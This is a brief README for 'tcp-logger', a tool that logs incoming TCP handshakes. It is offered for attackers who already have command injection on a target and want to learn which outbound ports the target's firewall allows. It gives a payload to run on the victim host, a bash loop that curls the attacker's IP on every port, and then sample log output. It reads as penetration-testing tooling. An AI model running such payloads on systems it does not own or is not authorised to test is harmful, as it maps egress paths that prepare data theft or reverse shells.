# tcp-logger

tcp handshake logger
useful to determine egress rules when you have command injection

Example payload to run on host
`for port in {1..65535}; do curl $ip:$port --connect-timeout .01; done;`

example output
```
$ ./logger
Logging all TCP handshakes except to/from port 22
2020/03/16 01:23:45 XXX.XXX.XXX.XXX 21(ftp)
2020/03/16 01:23:46 XXX.XXX.XXX.XXX 53(domain)
2020/03/16 01:23:47 XXX.XXX.XXX.XXX 80(http)
2020/03/16 01:23:48 XXX.XXX.XXX.XXX 139(netbios-ssn)
2020/03/16 01:23:55 XXX.XXX.XXX.XXX 443(https)
2020/03/16 01:23:55 XXX.XXX.XXX.XXX 445(microsoft-ds)
2020/03/16 01:26:44 XXX.XXX.XXX.XXX 8080(http-alt)
```